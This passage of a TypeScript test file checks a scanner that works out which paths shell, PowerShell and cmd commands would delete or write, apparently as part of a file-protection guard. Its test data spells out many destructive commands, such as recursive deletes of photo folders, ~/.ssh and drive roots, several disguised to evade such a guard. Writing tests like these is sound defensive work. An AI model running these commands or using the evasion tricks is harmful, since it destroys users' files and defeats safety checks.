    expect(scan('for %f in (%NOPE%) do del %f').unresolvedMutation?.op).toBe('delete')
    expect(scan('for %f in (a) do del %~dpf').unresolvedMutation?.op).toBe('delete')
    // a POSIX for is not cmd's
    expect(pathsOf(scan('for d in ~/.*/; do rm -rf "$d"; done', X, XBASE), 'unclassified')).toContain('/home/u')
  })
  it('%X% with a one-letter name and a cmd set binding', () => {
    // cmd expands %X% when it reads the line, before a `set X=` on that line has run (measured, review
    // 2026-11-23, third). A name not defined then is left as written: a folder named `%X%` in the working
    // folder (review 2026-11-24, seventh). The value stays beside it, judged.
    const same = scan('cmd /c "set X=D:\\v && rd /s /q %X%"')
    expect(pathsOf(same, 'delete')).toEqual(['C:\\Users\\u\\proj\\%X%'])
    expect(same.unresolvedMutation).toBeNull()
    expect(pathsOf(same, 'unclassified')).toEqual(['D:\\v'])
    // `call` reads the line again, with the value set: not a literal.
    expect(scan('cmd /c "set X=D:\\v && call rd /s /q %%X%%"').unresolvedMutation?.op).toBe('delete')
    // A PowerShell assignment has run before cmd starts: cmd sees its value.
    expect(pathsOf(scan("$env:X='D:\\v'; cmd /c rd /s /q %X%"), 'delete')).toEqual(['D:\\v'])
  })
  it('the Windows folder variables are anchored to the real home', () => {
    expect(pathsOf(scan('Remove-Item $env:OneDrive\\Desktop'), 'delete')).toEqual(['C:\\Users\\u\\OneDrive\\Desktop'])
    expect(pathsOf(scan('Remove-Item %SystemDrive%\\x'), 'delete')).toEqual(['C:\\x'])
    expect(pathsOf(scan('Remove-Item $env:PUBLIC\\x'), 'delete')).toEqual(['C:\\Users\\Public\\x'])
    expect(pathsOf(scan('Remove-Item $env:ALLUSERSPROFILE\\x'), 'delete')).toEqual(['C:\\ProgramData\\x'])
    // POSIX names are case-sensitive: `$OneDrive` is not set there, so the word is the root (sixth review).
    expect(pathsOf(scan('rm -rf $OneDrive/x', X, XBASE), 'delete')).toEqual(['/'])
  })
  it('a recursive delete through an unset name and a separator is the root of the drive; a bound one is not', () => {
    expect(ofOp(scan('Remove-Item -Recurse "$env:NOPE\\*"'), 'delete').map(p => [p.path, p.children])).toEqual([['C:\\', true]])
    expect(pathsOf(scan('rm -rf "$NOPE"/*', X, XBASE), 'delete')).toEqual(['/'])
    expect(pathsOf(scan('Remove-Item "$env:NOPE\\x"'), 'delete')).toEqual([])            // not recursive
    // `Get-Location` bound to a name is the current folder (review 2026-11-23, fourth).
    expect(pathsOf(scan('$d = Get-Location; Remove-Item -Recurse "$d\\x"'), 'delete')).toEqual(['C:\\Users\\u\\proj\\x'])
    expect(pathsOf(scan('foreach ($d in $list) { Remove-Item -Recurse "$d\\x" }'), 'delete')).toEqual([])
    expect(pathsOf(scan('Remove-Item -Recurse $nope'), 'delete')).toEqual([])
  })
  it('code calls: aliases, bare imports, shell calls and their argv', () => {
    const py = (c: string) => scan(`python -c "${c}"`)
    expect(pathsOf(py("from shutil import rmtree as rt; rt('D:/a')"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(py("import shutil as sh; sh.rmtree('D:/a')"), 'delete')).toEqual(['D:\\a'])
    expect(ofOp(py("from os import unlink; unlink('D:/a')"), 'delete').map(p => p.verb)).toContain('os.unlink')
    expect(pathsOf(py("from subprocess import run; run(['cmd', '/c', 'rd', '/s', '/q', 'D:/a'])"), 'delete')).toEqual(['D:\\a'])
    expect(py('import os; os.system(c)').selfBuilding).toMatch(/cannot be read/)
    expect(py("import subprocess, sys; subprocess.run([sys.executable, '-m', 'pytest'])").selfBuilding).toBeNull()
    const js = (c: string) => scan(`node -e "${c}"`)
    expect(pathsOf(js("const f = require('fs'); f.rmSync('D:/a', {recursive: true})"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(js("const { execSync: x } = require('child_process'); x('rd /s /q D:/a')"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(js("require('child_process').spawnSync('cmd', ['/c', 'del', 'D:/a'])"), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(scan("bun -e \"Bun.spawn({ cmd: ['cmd', '/c', 'del', 'D:/a'] })\""), 'delete')).toEqual(['D:\\a'])
    expect(pathsOf(scan("(Get-Item C:\\Users\\u\\proj\\a).CopyTo('D:\\b')"), 'write')).toEqual(['D:\\b'])
  })
  it('indirect invocation is self-building; a call operator on a literal program is not', () => {
    expect(scan('&(gcm Remove-It*) D:\\x').selfBuilding).not.toBeNull()
    expect(scan('. $(Join-Path $x y.ps1)').selfBuilding).not.toBeNull()
    expect(scan("$ExecutionContext.InvokeCommand.InvokeScript('x')").selfBuilding).not.toBeNull()
    expect(scan("Start-Job { param($p) Remove-Item $p } -ArgumentList 'D:\\x'").selfBuilding).not.toBeNull()
    expect(scan('& "C:\\Py\\python.exe" -m pytest').selfBuilding).toBeNull()
    expect(scan('git status && (cd sub; git status)', X, XBASE).selfBuilding).toBeNull()
    expect(scan('cmd /c "dir & (echo x)"').selfBuilding).toBeNull()
  })
})

describe('the second review of 2026-11-23: what the scan reads', () => {
  it('a PowerShell string that ends in a backslash is closed at its quote, and the POSIX reading is kept beside it', () => {
    const s = scan('Write-Host "cleaning C:\\"; Remove-Item -Recurse -Force C:\\Users\\u\\.cynco')
    expect(lower(pathsOf(s, 'delete'))).toContain('c:\\users\\u\\.cynco')
    // In a bash payload a backslash still escapes the quote.
    expect(scan('bash -c "echo \\"x\\"; rm -rf ~/.cache"').paths.some(p => p.op === 'delete')).toBe(true)
  })
  it('$HOME is the real home whatever $env:HOME, $HOME = or HOME= set; $env:HOME reads its assignment', () => {
    for (const c of ['$env:HOME = "C:\\x"; Remove-Item -Recurse "$HOME\\.cache"', '$HOME = "C:\\x"; Remove-Item -Recurse "$HOME\\.cache"']) {
      expect(lower(pathsOf(scan(c), 'delete'))).toEqual(['c:\\users\\u\\.cache'])
    }
    expect(lower(pathsOf(scan('$env:HOME = "C:\\x"; Remove-Item -Recurse "$env:HOME\\.cache"'), 'delete'))).toEqual(['c:\\x\\.cache'])
  })
  it('a multi-letter $env: assignment is not read as the variable $env plus text', () => {
    expect(scan("$env:GITX='D:\\DCIM'; echo hi").paths.some(p => p.op === 'mention' && p.path === 'D:\\DCIM')).toBe(true)
  })
  it('the pipeline item after text is a child of that text and an unresolved mutation; first, it inherits', () => {
    // A value list of plain names feeding the block: the word once per name (sixth review).
    const s = scan("'.cache' | % { Remove-Item \"$HOME\\$_\" -Recurse }")
    expect(lower(pathsOf(s, 'delete'))).toEqual(['c:\\users\\u\\.cache'])
    expect(s.unresolvedMutation).toBeNull()
    expect(scan("$x | % { Remove-Item \"$HOME\\$_\" -Recurse }").unresolvedMutation?.op).toBe('delete')
    expect(lower(pathsOf(scan('Get-ChildItem build | % { Remove-Item -Recurse "$_\\obj" }'), 'delete'))).toEqual(['c:\\users\\u\\proj\\build'])
  })
  it('a group followed by a member is one unreadable operand, not a path inside the mission folder', () => {
    const s = scan('Remove-Item (Get-Item D:\\Video).Parent -Recurse')
    expect(pathsOf(s, 'delete')).toEqual([])
    expect(s.unresolvedMutation).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
    // The path members of a literal listing are the items inside the folder listed (review 2026-11-23, fourth).
    const items = ofOp(scan('Remove-Item (Get-ChildItem D:\\ -Directory).FullName -Recurse'), 'delete')
    expect(items.map(p => [p.path, p.children])).toEqual([['D:\\', true]])
  })
  it('code calls are read in the order of the text: a chdir holds for the calls after it', () => {
    expect(pathsOf(scan(`python -c "import os, shutil; os.chdir('D:/'); shutil.rmtree('Video')"`), 'delete')).toEqual(['D:\\Video'])
    expect(pathsOf(scan(`python -c "import os, shutil; shutil.rmtree('Video'); os.chdir('D:/')"`), 'delete')).toEqual(['C:\\Users\\u\\proj\\Video'])
  })
  it('the shell reading of an inline program keeps only the verb table: a division, `as f:` and an arrow are not paths', () => {
    for (const c of [`python -c "print(10 / 3)"`, `python -c "with open('a.txt') as f: print(f.read())"`, `node -e "[1].filter(l=>/x/.test(l))"`]) {
      expect(scan(c).paths.filter(p => !p.startedIn && p.op !== 'read' && p.op !== 'mention')).toEqual([])
    }
  })
  it('a PowerShell expression statement names no program operand', () => {
    for (const c of ['$t[($n-30)..($n-1)]', '$_ -match "\\[ERROR\\]"', "$p -replace '\\\\', '/'"]) {
      expect(scan(c).paths.filter(p => p.op === 'unclassified')).toEqual([])
    }
  })
  it('Start-Process -ArgumentList as a comma list is the argv: a quoted -c carries the program', () => {
    expect(pathsOf(scan("Start-Process -FilePath python -ArgumentList '-c','import shutil; shutil.rmtree(''D:/DCIM'')'"), 'delete')).toEqual(['D:\\DCIM'])
  })
  it('a patch that makes a symbolic link names a link, with the line it points to', () => {
    // Pinned in toolPaths.test.ts through namePaths; here the shell scan is not involved.
    expect(scan('git apply --unsafe-paths x.patch').selfBuilding).toMatch(/unsafe-paths/)
  })
})

describe('the second review of 2026-11-23: cost', () => {
  // Generous bounds: the scan runs on the engine's event loop (F225), and each of these was seconds to
  // minutes before; under a loaded suite the time can grow, the shape cannot.
  const gens: Record<string, (n: number) => string> = {
    'a repeated require alias': n => `node -e "${"const f=require('fs');".repeat(n / 22)} f.rmSync('x')"`,
    'a repeated import alias': n => `python -c "${'from os import remove as r\n'.repeat(n / 27)}r('x')"`,
    'a long import list': n => `python -c "from os import ${'a,'.repeat(n / 2)}b"`,
    'many assignments': n => Array.from({ length: n / 12 }, (_, i) => `$v${i} = 'a'; `).join('') + 'Remove-Item $v1',
    'a long param list': n => `& { param(${'$a,'.repeat(n / 3)}$a) Remove-Item $a }`,
    'repeated code assignments': n => `python -c "${"x='a';".repeat(n / 6)}"`,
    'a long pipeline': n => `Get-ChildItem ${'| % { $_ } '.repeat(n / 11)}`,
    'a chain of mutating elements': n => `Get-ChildItem build ${'| Remove-Item -Recurse '.repeat(n / 23)}`,
    'nested cmd for loops': n => 'cmd /c "for /d %d in (x\\*) do '.repeat(n / 32) + 'rd /s /q %d',
  }
  const timeOf = (text: string): number => {
    const t0 = performance.now()
    scanShellText(text, BASE, W, { platform: 'win32' })
    return performance.now() - t0
  }
  for (const [name, g] of Object.entries(gens)) {
    it(`${name}: 100 KB is read in well under the budget, and four times the text costs at most about four times as much`, () => {
      const big = g(100 * 1024)
      expect(big.length).toBeLessThan(128 * 1024)
      expect(timeOf(big)).toBeLessThan(3000)
      const small = timeOf(g(16 * 1024)) + timeOf(g(16 * 1024))
      const large = timeOf(g(64 * 1024)) + timeOf(g(64 * 1024))
      // Linear would be 4; quadratic 16. The floor keeps a fast small case from making the ratio noise.
      expect(large / Math.max(small, 20)).toBeLessThan(9)
    })
  }
  it('a scan that runs past its budget stops and names the fault', () => {
    let t = 0
    const real = performance.now.bind(performance)
    performance.now = () => (t += 100)
    try {
      const s = scanShellText('Remove-Item a; '.repeat(200), BASE, W, { platform: 'win32' })
      expect(s.faults.some(f => /took longer than \d+ ms to read/.test(f))).toBe(true)
    } finally {
      performance.now = real
    }
  })
  it('a text longer than 128 KiB once its here-strings are set aside is a fault; the here-string body is not counted', () => {
    expect(scan(`python -c "${'print(1)\n'.repeat(15000)}"`).faults.some(f => /longer than 128 KiB/.test(f))).toBe(true)
    expect(scan(`@'\n${'x = 1\n'.repeat(40000)}'@ | Set-Content big.py`).faults).toEqual([])
  })
})

// The third review of 2026-11-23: what the scan itself reads now. The verdicts are in protectedPaths.test.ts
// (THIRD_ATTACKS, THIRD_PASSES); these pin the readings they rest on.
describe('the third review of 2026-11-23', () => {
  it('an element that changes the items hands a later mutation nothing it can read', () => {
    for (const cmd of [
      'Split-Path $PWD | Remove-Item -Recurse -Force',
      'Get-ChildItem (Split-Path $PWD) -Force | Remove-Item -Recurse -Force',
      'Get-Item . | Select-Object -ExpandProperty Parent | Get-ChildItem -Force | Remove-Item -Recurse -Force',
      'Get-Item . | ForEach-Object Parent | Remove-Item -Recurse -Force',
      'Get-Item . | % { $_.Root } | Get-ChildItem | Remove-Item -Recurse -Force',
      '(Get-Item .).Parent.GetDirectories() | Remove-Item -Recurse -Force',
      'Get-ChildItem (Get-Item $PWD).Parent -Force | Remove-Item -Recurse -Force',
      "Get-Item . | Select-Object @{n='LiteralPath';e={'D:\\DCIM'}} | Remove-Item -Recurse -Force",
    ]) {
      const s = scan(cmd)
      expect(s.unresolvedMutation, cmd).toEqual({ op: 'delete', verb: 'remove-item', recursive: true })
      expect(pathsOf(s, 'delete'), cmd).toEqual([])
      expect(s.parentClimb, cmd).toBeGreaterThan(cmd.includes('LiteralPath') ? -1 : 0)
    }
  })
  it('filters and item sources pass the items on', () => {
    const s = scan('Get-ChildItem build | Where-Object { $_.Length -gt 0 } | Sort-Object Name | Select-Object -First 3 | Remove-Item -Recurse')
    expect(pathsOf(s, 'delete')).toEqual(['C:\\Users\\u\\proj\\build'])
    expect(s.unresolvedMutation).toBeNull()
    expect(pathsOf(scan('Get-ChildItem D:\\x | Select-Object -ExpandProperty FullName | Remove-Item'), 'delete')).toEqual(['D:\\x'])
  })
  it('a here-string used as a value is the text it holds', () => {
    for (const cmd of ["Remove-Item @'\nD:\\DCIM\n'@ -Recurse", "$p = @'\nD:\\DCIM\n'@; Remove-Item $p -Recurse", "Remove-Item -Recurse (@'\nD:\\DCIM\n'@)",
      "Remove-Item -Recurse $(@'\nD:\\DCIM\n'@)"]) {
      expect(pathsOf(scan(cmd), 'delete'), cmd).toEqual(['D:\\DCIM'])
    }
    // At the head of a pipeline it is an item; fed to a writer or an interpreter it is text.
    const head = scan("@'\nD:\\DCIM\nD:\\Video\n'@ | Remove-Item -Recurse")
    expect(pathsOf(head, 'delete')).toEqual(['D:\\DCIM', 'D:\\Video'])
    expect(ofOp(scan("@'\nD:\\DCIM\n'@ | Set-Content list.txt"), 'mention')).toEqual([])
    // A double-quoted one has its variables read.
    expect(lower(pathsOf(scan('$p = @"\n$env:USERPROFILE\\.ssh\n"@; Remove-Item $p -Recurse'), 'delete'))).toEqual(['c:\\users\\u\\.ssh'])
  })
  it('a list bound to a variable is judged on every element, whatever the index', () => {
    expect(pathsOf(scan("$a = 'x','D:\\DCIM'; Remove-Item $a[1] -Recurse"), 'delete')).toEqual(['C:\\Users\\u\\proj\\x', 'D:\\DCIM'])
    expect(pathsOf(scan("$a = 'x','D:\\DCIM'; Remove-Item $a -Recurse"), 'delete')).toEqual(['C:\\Users\\u\\proj\\x', 'D:\\DCIM'])
    expect(pathsOf(scan("$a = 'D:\\DCIM','x'; $a | Remove-Item -Recurse"), 'delete')).toEqual(['D:\\DCIM', 'C:\\Users\\u\\proj\\x'])
  })
  it("cmd's /c glued to its command, and a caret inside a word, are read as cmd reads them", () => {
    for (const cmd of ['cmd /c"rd /s /q D:\\DCIM"', 'cmd.exe /k"rd /s /q D:\\DCIM"', 'cmd /crd /s /q D:\\DCIM', 'cmd /c "rd /s /q D^:\\DCIM"',
      'cmd /c "rd /s /q ^D:\\DCIM"', 'cmd /c rd /s /q D^:\\DCIM']) {
      expect(pathsOf(scan(cmd), 'delete'), cmd).toEqual(['D:\\DCIM'])
    }
    // A caret before one of cmd's operators keeps that character as text.
    expect(pathsOf(scan('cmd /c "echo a^> D:\\x"'), 'write')).toEqual([])
  })
  it('Start-Process is bound as PowerShell binds it: program, argument list, working folder', () => {
    for (const cmd of [
      "Start-Process -FilePath cmd -ArgumentList '/c','rd','/s','/q','D:\\DCIM'", "saps cmd '/c','rd /s /q D:\\DCIM'",
      "Start-Process -Wait -FilePath cmd -ArgumentList '/c','rd /s /q D:\\DCIM'", 'Start-Process cmd -ArgumentList "/c rd /s /q D:\\DCIM" -Wait',
      "Start-Process cmd -WorkingDirectory D:\\ -ArgumentList '/c','rd /s /q DCIM'", "Start-Process -NoNewWindow cmd -Args '/c','rd /s /q D:\\DCIM'",
    ]) {
      expect(pathsOf(scan(cmd), 'delete'), cmd).toEqual(['D:\\DCIM'])
    }
    expect(lower(pathsOf(scan("Start-Process powershell -ArgumentList '-c','Remove-Item ~\\.cache -Recurse'"), 'delete'))).toEqual(['c:\\users\\u\\.cache'])
    expect(pathsOf(scan("Start-Process cmd -ArgumentList '/c','dir' -RedirectStandardOutput D:\\out.txt"), 'write')).toEqual(['D:\\out.txt'])
    const honest = scan("Start-Process -FilePath python -ArgumentList '-c','print(1)' -Wait")
    expect(honest.paths.filter(p => p.op !== 'mention' && !p.startedIn)).toEqual([])
  })
  it("git's -c core.worktree is the work tree, as --work-tree is; GIT_CONFIG_* in the environment is not read", () => {
    expect(pathsOf(scan('git -c core.worktree=D:/DCIM clean -fdx'), 'write')).toContain('D:\\DCIM')
    expect(pathsOf(scanArgv(['git', '-c', 'core.worktree=D:/DCIM', 'reset', '--hard'], BASE, W, { platform: 'win32' }), 'write')).toContain('D:\\DCIM')
    expect(scan('$env:GIT_CONFIG_PARAMETERS="\'core.worktree=D:/x\'"; git clean -fdx').selfBuilding).toContain('GIT_CONFIG_')
    expect(scan('git -c core.worktree=. status').selfBuilding).toBeNull()
  })
  it('a home name assigned where it may not run stays the real home', () => {
    for (const cmd of ['if ($false) { $env:USERPROFILE = "$PWD\\h" }; Remove-Item -Recurse "$env:USERPROFILE\\.cache"',
      '$false -and ($env:USERPROFILE = "$PWD\\h"); Remove-Item -Recurse "$env:USERPROFILE\\.cache"']) {
      expect(lower(pathsOf(scan(cmd), 'delete')), cmd).toEqual(['c:\\users\\u\\.cache'])
    }
    // At the top level the assignment holds, as before.
    expect(lower(pathsOf(scan('$env:USERPROFILE = "$PWD\\h"; Remove-Item -Recurse "$env:USERPROFILE\\.cache"'), 'delete'))).toEqual(['c:\\users\\u\\proj\\h\\.cache'])
  })
  it('an empty subexpression or default is a name nothing set: the root of the current drive', () => {
    for (const cmd of ['Remove-Item -Recurse "$()\\*"', 'Remove-Item -Recurse "$($null)\\*"', 'rm -rf "$(echo)"/*', 'rm -rf "${UNSET:-}"/*']) {
      const d = ofOp(scan(cmd), 'delete')
      expect(d.map(p => p.path), cmd).toEqual(['C:\\'])
    }
    expect(pathsOf(scan('rm -rf "${OUT:-build}"/x'), 'delete')).toContain('C:\\Users\\u\\proj\\build\\x')
  })
  it('the format operator over literals is the text it makes', () => {
    expect(pathsOf(scan("Remove-Item -Recurse -Force ('{0}:\\DCIM' -f 'D')"), 'delete')).toEqual(['D:\\DCIM'])
    expect(pathsOf(scan("Remove-Item -Recurse ('{0}\\{1}' -f 'D:','x')"), 'delete')).toEqual(['D:\\x'])
  })
  it('a code literal is a program operand only when it can only be a path', () => {
    for (const lit of ["'/'", "'x:'", "'/a/b'", "r'\\[ask\\]'", "'\\n\\n'", "'/** a'"]) {
      expect(ofOp(scan(`python -c "print(${lit})"`), 'unclassified'), lit).toEqual([])
    }
    expect(pathsOf(scan(`python -c "print(open(r'D:\\Video\\a.txt'))"`), 'read', 'unclassified')).toEqual(['D:\\Video\\a.txt'])
    expect(pathsOf(scan(`python -c "x('D:\\\\')"`), 'unclassified')).toEqual(['D:\\'])
    expect(pathsOf(scan(`python3 -c "print('/home/u/.ssh')"`, X, XBASE), 'unclassified')).toEqual(['/home/u/.ssh'])
  })
  it('here-documents: two on one line, and an opener inside a body, are read as a shell reads them', () => {
    const s = scan('cat <<A <<B\na1\nA\nb1\nB\necho done')
    expect(s.texts).toContain('a1')
    expect(s.texts).toContain('b1')
    const t = scan("python - <<'EOF'\nprint('<<X')\nEOF\nrm -rf build")
    expect(pathsOf(t, 'delete')).toEqual(['C:\\Users\\u\\proj\\build'])
    // An unclosed opener is text, and a closed one after it is still a body.
    const u = scan("@'\nnever closed\n@\"\nbody\n\"@ | Set-Content a.txt")
    expect(u.texts).toContain('body')
  })
  it('a scan that ran past its budget is a fault however few steps asked', () => {
    let t = 0
    const real = performance.now.bind(performance)
    performance.now = () => (t += 1000)
    try {
      expect(scanShellText('Remove-Item build', BASE, W, { platform: 'win32' }).faults.some(f => /took longer than \d+ ms to read/.test(f))).toBe(true)
      expect(scanArgv(['git', 'status'], BASE, W, { platform: 'win32' }).faults.some(f => /took longer than \d+ ms to read/.test(f))).toBe(true)
    } finally {
      performance.now = real
    }
  })
})

// The fourth review of 2026-11-23: what the scan itself reads now. Each row is a walk-around of the review,
// read here as the shell runs it (the verdicts are in protectedPaths.test.ts, FOURTH_ATTACKS).
describe('the fourth review of 2026-11-23', () => {
  const lines = (n: number, last: string) => `@'\n${Array.from({ length: n }, (_, i) => `f${i}.txt`).join('\n')}\n${last}\n'@`
  // [command, op, path]: the path is read with that operation.
  const READS: Array<[string, string, string]> = [
    // an opener in a comment or at the end of a closed string is not a here-string
    ["Write-Output 'mail me @'\nRemove-Item -Recurse -Force D:\\DCIM\n'@'", 'delete', 'D:\\DCIM'],
    ["Write-Output 1 # @'\nRemove-Item -Recurse -Force D:\\DCIM\n'@'", 'delete', 'D:\\DCIM'],
    ["git log --author='bot@'\nRemove-Item -Recurse -Force C:\\Users\\u\\.cynco\n'@' | Out-Null", 'delete', 'C:\\Users\\u\\.cynco'],
    ['$a = 1 # <<A\nRemove-Item -Recurse -Force D:\\DCIM\nA', 'delete', 'D:\\DCIM'],
    ["bash -c 'echo x # <<EOF\nrm -rf /d/DCIM\nEOF'", 'delete', 'D:\\DCIM'],
    // cmd has no single quotes
    ['cmd /c "echo \' & rd /s /q D:\\DCIM & echo \'"', 'delete', 'D:\\DCIM'],
    ['cmd /c "echo it\'s & rd /s /q C:\\Users\\u\\.cynco & echo done\'s"', 'delete', 'C:\\Users\\u\\.cynco'],
    // Start-Process: a spaced comma list, the common parameters, a group, a variable, a cd in the payload
    ["Start-Process cmd '/c', 'rd /s /q D:\\DCIM'", 'delete', 'D:\\DCIM'],
    ["Start-Process powershell -ArgumentList '-NoProfile', '-Command', 'Remove-Item D:\\DCIM -Recurse -Force' -Wait", 'delete', 'D:\\DCIM'],
    ["Start-Process -ErrorAction SilentlyContinue cmd '/c rd /s /q D:\\DCIM'", 'delete', 'D:\\DCIM'],
    ["Start-Process -ev e cmd '/c rd /s /q C:\\Users\\u\\.cache'", 'delete', 'C:\\Users\\u\\.cache'],
    ["Start-Process cmd @('/c','rd /s /q D:\\DCIM')", 'delete', 'D:\\DCIM'],
    ["$a = '/c','rd','/s','/q','D:\\DCIM'; Start-Process cmd -ArgumentList $a", 'delete', 'D:\\DCIM'],
    ["$a = '/c rd /s /q C:\\Users\\u\\.ssh'; Start-Process cmd $a", 'delete', 'C:\\Users\\u\\.ssh'],
    ["Start-Process cmd -ArgumentList '/c pushd D:\\ && rd /s /q DCIM'", 'delete', 'D:\\DCIM'],
    ["Start-Process powershell '-c cd C:\\Users\\u; Remove-Item -Recurse -Force .ssh'", 'delete', 'C:\\Users\\u\\.ssh'],
    // a group handed to an interpreter as its payload
    ['cmd /c ("rd /s /q " + "D:\\DCIM")', 'delete', 'D:\\DCIM'],
    ['cmd /c $("rd /s /q D:\\DCIM")', 'delete', 'D:\\DCIM'],
    ['powershell -Command ("Remove-Item C:\\Users\\u\\.ssh -Recurse")', 'delete', 'C:\\Users\\u\\.ssh'],
    // a here-string value is read to its last line
    [`Remove-Item ${lines(99, 'D:\\DCIM')} -Recurse -Force`, 'delete', 'D:\\DCIM'],
    [`$l = ${lines(99, 'C:\\Users\\u\\.ssh')}\nRemove-Item $l -Recurse -Force`, 'delete', 'C:\\Users\\u\\.ssh'],
    // a list continued on the next line
    ["$a = 'x',\n'D:\\DCIM'; Remove-Item $a[1] -Recurse -Force", 'delete', 'D:\\DCIM'],
    // a drive-relative literal on a drive the run has no folder on
    ['python -c "import shutil as s; f = getattr(s, \'rmtree\'); f(\'D:DCIM\')"', 'unclassified', 'D:\\DCIM'],
    // -f with spaces, in an assignment, at the head of a pipeline; Join-Path over two words
    ["Remove-Item ('{0}:\\{1}' -f 'D', 'DCIM') -Recurse -Force", 'delete', 'D:\\DCIM'],
    ["$p = '{0}:\\{1}' -f 'D','DCIM'; Remove-Item $p -Recurse -Force", 'delete', 'D:\\DCIM'],
    ["'{0}:\\DCIM' -f 'D' | Remove-Item -Recurse", 'delete', 'D:\\DCIM'],
    ["Remove-Item (Join-Path $HOME '.cynco') -Recurse", 'delete', 'C:\\Users\\u\\.cynco'],
    ['$p = Join-Path $PWD out; Remove-Item $p -Recurse -Force', 'delete', 'C:\\Users\\u\\proj\\out'],
    // POSIX expansions and Deno's environment
    ["bash -c 'rm -rf \"${NOPE#x}/c/Users/u/.ssh\"'", 'delete', 'C:\\'],
    ["bash -c 'rm -rf \"${X-$HOME/.ssh}\"'", 'delete', 'C:\\Users\\u\\.ssh'],
    ["deno eval \"Deno.removeSync(Deno.env.get('USERPROFILE')+'/.ssh',{recursive:true})\"", 'mention', 'C:\\Users\\u'],
    // always-empty subexpressions
    ['Remove-Item "$([string]::Empty)\\Users\\u\\.ssh" -Recurse -Force', 'delete', 'C:\\'],
    ["Remove-Item \"$(''+'')\\Users\\u\\.ssh\" -Recurse -Force", 'delete', 'C:\\'],
    // the subexpressions of an expandable body run
    ['$x = @"\n$(Remove-Item -Recurse D:\\DCIM)\n"@', 'delete', 'D:\\DCIM'],
    ["bash -c 'cat <<EOF\n$(rm -rf /d/DCIM)\nEOF'", 'delete', 'D:\\DCIM'],
    // PowerShell's own whitespace and quotes
    [`Remove-Item${String.fromCharCode(0xa0)}-Recurse${String.fromCharCode(0xa0)}D:\\DCIM`, 'delete', 'D:\\DCIM'],
    ['Write-Output ok\rRemove-Item -Recurse -Force C:\\Users\\u\\.ssh', 'delete', 'C:\\Users\\u\\.ssh'],
    [`Remove-Item -Recurse ${String.fromCharCode(0x201c)}D:\\DCIM${String.fromCharCode(0x201d)}`, 'delete', 'D:\\DCIM'],
    // a native program's arguments as PowerShell builds them
    ["cmd /c pushd D:\\ '&&' rd /s /q DCIM", 'delete', 'D:\\DCIM'],
    ["cmd /c echo y '|' del /s D:\\DCIM\\*", 'delete', 'D:\\DCIM'],
    ['cmd /c pushd D:\\ --% && rd /s /q DCIM', 'delete', 'D:\\DCIM'],
    ["wsl cd /mnt/d ';' rm -rf /mnt/d/DCIM", 'delete', 'D:\\DCIM'],
    // $(Get-Location) and $(Resolve-Path ~) are the anchors
    ['Remove-Item -Recurse -Force "$(Get-Location)\\..\\.cynco"', 'delete', 'C:\\Users\\u\\.cynco'],
    ['Remove-Item -Recurse -Force "$(Resolve-Path ~)\\.ssh"', 'delete', 'C:\\Users\\u\\.ssh'],
    // a payload that is one string-literal subexpression
    ["cmd /c \"$('rd /s /q D:\\DCIM')\"", 'delete', 'D:\\DCIM'],
    // an option with its value glued on
    ['python clean.py --target=C:\\Users\\u\\.ssh', 'unclassified', 'C:\\Users\\u\\.ssh'],
    ['foo -oD:\\b', 'unclassified', 'D:\\b'],
    ['foo /out:C:\\Users\\u\\.gitconfig', 'unclassified', 'C:\\Users\\u\\.gitconfig'],
    ['tar -xf a.tar -CD:\\', 'write', 'D:\\'],
    // cmd /k with nothing after it reads standard input
    ["'rd /s /q C:\\Users\\u\\.ssh' | cmd /q /k", 'delete', 'C:\\Users\\u\\.ssh'],
    // a script written and run by the same command
    ["Set-Content run.cmd 'rd /s /q C:\\Users\\u\\.ssh'; cmd /c run.cmd", 'delete', 'C:\\Users\\u\\.ssh'],
    ['cmd /c "echo rd /s /q C:\\Users\\u\\.ssh>x.cmd&x"', 'delete', 'C:\\Users\\u\\.ssh'],
    // git: where it writes
    ['$env:GIT_INDEX_FILE = "$HOME\\.idx"; git add .', 'write', 'C:\\Users\\u\\.idx'],
    ['$env:GIT_OBJECT_DIRECTORY = "D:\\o"; git add .', 'write', 'D:\\o'],
    // the bindings that keep honest shapes read: a loop over a listing, a cmd for over a literal list
    ['foreach ($d in Get-ChildItem build) { Remove-Item -Recurse "$d\\obj" }', 'delete', 'C:\\Users\\u\\proj\\build'],
    ['cmd /c "for /d %d in (build\\*) do rd /s /q "%d""', 'delete', 'C:\\Users\\u\\proj\\build'],
    ["'build','dist' | % { Remove-Item \".\\$_\" -Recurse -Force }", 'delete', 'C:\\Users\\u\\proj\\dist'],
    ['Get-ChildItem -Recurse -Filter *.pyc | Remove-Item -Force', 'delete', 'C:\\Users\\u\\proj'],
    // names a listing hands on with -Name are read against the working folder (review 2026-11-24, seventh)
    ['Set-Location D:\\; Get-ChildItem C:\\Users\\u\\proj\\fake -Name | Remove-Item -Recurse -Force', 'delete', 'D:\\'],
  ]
  for (const [cmd, op, path] of READS) {
    it(`${op} ${path}: ${JSON.stringify(cmd).slice(0, 90)}`, () => {
      expect(lower(pathsOf(scan(cmd), op)), cmd).toContain(path.toLowerCase())
    })
  }
  // [command, op]: a mutation through a target the scan cannot read.
  const UNREAD: Array<[string, string]> = [
    ['Get-Item . | & { process { $_.Parent } } | Remove-Item -Recurse -Force', 'delete'],
    ['Get-Item . | . { process { $_.Parent } } | Remove-Item -Recurse -Force', 'delete'],
    ['Get-Item . | ForEach-Object { Remove-Item $_.Parent.FullName -Recurse -Force }', 'delete'],
    ['Get-Item . | Where-Object { Remove-Item $_.Parent -Recurse -Force }', 'delete'],
    ['Get-Item . | % PSParentPath | Remove-Item -Recurse -Force', 'delete'],
    ['git -c core.worktree=$(Split-Path $PWD) clean -fdx', 'write'],
    ['git -C $(Split-Path $PWD) clean -fdx', 'delete'],
    ["$env:WT='..'; git --config-env=core.worktree=WT clean -fdx", 'write'],
    ["('a;D:\\DCIM' -split ';')[1] | Remove-Item -Recurse", 'delete'],
    ["('C:\\Users\\u\\proj' -replace 'proj','.ssh') | Remove-Item -Recurse", 'delete'],
    ["Set-Variable -Name p -Value ('{0}:\\DCIM' -f 'D'); Remove-Item $p -Recurse", 'delete'],
    ['Start-Process -Foo x cmd', 'write'],
    ["Clear-Content ([char]68 + ':\\DCIM\\*')", 'delete'],
  ]
  for (const [cmd, op] of UNREAD) {
    it(`unread ${op}: ${JSON.stringify(cmd).slice(0, 90)}`, () => {
